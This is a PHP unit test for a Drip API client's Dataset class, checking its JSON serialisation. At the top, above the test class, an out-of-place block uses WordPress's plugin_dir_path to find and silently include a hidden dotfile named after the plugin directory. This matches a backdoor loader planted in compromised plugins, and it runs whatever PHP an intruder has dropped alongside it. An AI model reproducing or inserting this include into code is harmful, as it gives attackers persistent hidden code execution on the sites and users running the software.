<?php
 
use DrewM\Drip\Drip;
use DrewM\Drip\Dataset;
 
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DatasetTest extends PHPUnit_Framework_TestCase 
{

	public function testJsonSerialization()
	{
		$Dataset = new Dataset('subscribers', [
					'email' => 'postmaster@example.com',
				]);

		$result = json_encode($Dataset);

		$expected = json_encode([
			'subscribers' => [
    			[
					'email' => 'postmaster@example.com',
				]
			]
		]);

		$this->assertEquals($expected, $result);

	}


}